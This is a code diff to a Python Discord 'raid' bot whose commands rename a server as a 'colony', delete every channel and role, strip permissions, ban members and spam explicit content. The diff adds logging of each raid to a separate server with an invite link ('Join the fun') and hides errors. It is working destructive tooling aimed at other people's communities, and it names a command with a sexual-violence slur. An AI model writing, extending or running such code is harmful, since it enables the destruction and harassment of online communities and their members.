@@ -29,7 +29,7 @@ class Bot(cmd.Bot):
         return ctx.author.id == self.user.id
 
     def registerCommands(self):
-        print("__Members_______________________________")
+        print("__Object Members_______________________________")
         for member in inspect.getmembers(self):
             if "discord.ext.commands.core.Command" in repr(member[1]):
                 print(member)
@@ -41,9 +41,9 @@ class Bot(cmd.Bot):
             print(customCommand)
             self.add_command(getattr(self, customCommand))
         print("________________________________________")
-
-    async def on_ready(self):
+        
         print("__Login_________________________________")
+    async def on_ready(self):
         print('Connected to Discord as')
         print(self.user.name)
         print(self.user.id)
@@ -165,6 +165,8 @@ class Bot(cmd.Bot):
 
     @cmd.command()
     async def colony(ctx):
+
+        originalname = ctx.guild.name
         # --Claim the server as a colony of Heinz--
         await ctx.guild.edit(name="Colony of The Democratic Republic Of Heinz")  # change server name
 
@@ -173,6 +175,8 @@ class Bot(cmd.Bot):
 
     @cmd.command()
     async def rape(ctx, *args):
+        global originalname
+
         # --Destroy the server--
         
         # -delete all channels-
@@ -187,21 +191,34 @@ class Bot(cmd.Bot):
         # -make new channel-
         bot = ctx.bot
         heinz = await ctx.guild.create_text_channel('HEINZ')
-        print(heinz.name)
         await heinz.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
+
+        # -log the rape-
+        for guild in ctx.bot.guilds:
+            if guild.name == "beenzbot-Log":
+                logserver = guild
+        
+        if originalname == None:
+            originalname = heinz.guild.name
+            
+
+        unban = await heinz.create_invite(reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
+        await logserver.channels[0].send("@everyone new raid: " + originalname)
+        await logserver.channels[0].send("Join the fun at " + unban.url)
+
+        originalname = None
 
         # -delete all roles-
         roles = []
 
         for role in heinz.guild.roles:  # get all roles
             roles.append(role)
-        print(roles)
 
         for role in roles:
             try:
                 await role.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
             except Exception:
-                await heinz.send("`error deleting role`")
+                pass
 
         # -remove all perms-
         perms = discord.Permissions()  # create new empty permissions object
@@ -247,7 +264,7 @@ class Bot(cmd.Bot):
             try:
                 await member.ban()
             except Exception:
-                await heinz.send("couldn't ban")
+                pass
 
         
             for i in range(1000):  # send hentai until bot is banned
